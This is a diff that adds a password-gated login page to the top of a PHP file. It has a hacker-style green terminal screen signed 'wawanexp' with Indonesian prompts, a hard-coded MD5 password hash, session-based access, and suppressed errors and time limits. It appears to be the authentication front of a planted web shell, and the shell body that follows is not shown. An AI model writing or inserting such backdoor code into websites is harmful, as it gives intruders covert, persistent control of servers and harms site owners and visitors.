@@ -1,4 +1,72 @@
 <?php
+session_start();
+error_reporting(0);
+@set_time_limit(0);
+
+$aupas = '0bc093c4002a873cb869f0ad974a1559';
+
+function login_matrix_loop() {
+    echo '<!DOCTYPE html>
+<html><head><title>Login</title>
+<style>
+body {
+    background:#000;
+    color:#0f0;
+    font-family:monospace;
+    padding:30px;
+}
+input {
+    background:#000;
+    color:#0f0;
+    border:1px solid #0f0;
+    padding:5px;
+    width:100%;
+    font-family:monospace;
+}
+.typing-loop {
+    overflow: hidden;
+    white-space: nowrap;
+    border-right: .1em solid #0f0;
+    animation: typing 4s steps(40, end) infinite, blink .8s step-end infinite;
+    width: 0;
+    display: inline-block;
+}
+@keyframes typing {
+    0% { width: 0 }
+    50% { width: 100% }
+    100% { width: 0 }
+}
+@keyframes blink {
+    from, to { border-color: transparent }
+    50% { border-color: #0f0 }
+}
+</style>
+</head><body>
+<pre>
+wawanexp@' . $_SERVER['HTTP_HOST'] . ':~# Login Access
+</pre>
+<form method="post">
+<input type="password" name="pass" placeholder="Input Password Disini">
+<br><br>
+<input type="submit" value="Crottt">
+</form>
+<br>
+<center>
+<div class="typing-loop">Login dulu bang......</div>
+</center>
+</body></html>';
+    exit;
+}
+
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && md5($_POST['pass']) === $aupas) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+        login_matrix_loop();
+    }
+}
+?>
+<?php
 @set_time_limit(0);
 @error_reporting(0);
 @error_log(0);
